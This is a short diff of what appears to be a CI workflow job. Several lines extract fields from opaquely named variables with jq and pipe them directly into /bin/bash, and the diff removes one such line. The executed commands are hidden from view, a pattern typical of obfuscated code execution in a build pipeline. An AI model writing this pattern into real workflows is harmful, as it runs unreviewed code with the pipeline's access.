@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$eexx1929" | jq -r .yc77029 | /bin/bash
           printf '%s' "$sh9" | jq -r .kpvg2 | /bin/bash
           echo $pxd63 | jq -r .kirbi0 | /bin/bash
-          printf '%s' "$c03" | jq -r .rmrhu78 | /bin/bash
           echo $e74 | jq -r .s10785 | /bin/bash
 
       - name: Store results
